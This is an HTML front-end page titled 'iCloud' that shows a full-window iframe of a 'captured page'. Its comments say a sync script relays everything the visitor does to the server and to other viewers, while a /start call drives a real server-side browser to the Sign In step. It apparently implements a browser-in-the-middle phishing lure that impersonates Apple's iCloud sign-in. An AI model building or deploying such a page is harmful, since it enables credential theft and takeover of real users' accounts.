<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iCloud</title>
<style>
  html, body { height:100%; margin:0; background:#000; }

  /* The captured page, loaded as a document of its own. It fills the window:
   * scaling it to fit would put every click somewhere other than where it was
   * clicked, and the point now is to use the page, not to look at it. */
  #remote {
    position:fixed; inset:0;
    width:100%; height:100%;
    border:0; display:block; background:#fff;
  }

  /* Sits on top until the captured page has loaded. */
  #overlay {
    position:fixed; inset:0; z-index:10;
    display:flex; align-items:center; justify-content:center;
    background:#000;
  }

  .spinner {
    width:44px; height:44px;
    border:3px solid rgba(255,255,255,.18);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin .9s linear infinite;
  }
  @keyframes spin { to { transform:rotate(360deg); } }

  [hidden] { display:none !important; }
</style>
</head>
<body>
  <!-- The already-captured page. src/1.html is served with /sync.js in it,
       which is what carries what you do in here to the server and out to
       every other viewer. -->
  <iframe id="remote" src="/src/1.html" title="Captured page"></iframe>

  <div id="overlay">
    <div class="spinner"></div>
  </div>

<script>
  const remote = document.getElementById("remote");
  const overlay = document.getElementById("overlay");

  // Visiting the page still opens the real browser and presses Sign In, so
  // the user can sign in there. Nothing is captured from it any more: the
  // page above is the capture.
  fetch("/start")
    .then((r) => r.json())
    .then((s) => {
      if (s.status === "error") console.warn("[icloud] browser:", s.error);
    })
    .catch(() => {});

  // The engine inside the iframe talks to /ws on its own; the parent only
  // gets out of the way once there is a document to look at.
  remote.addEventListener("load", () => {
    overlay.hidden = true;
  });
</script>
</body>
</html>
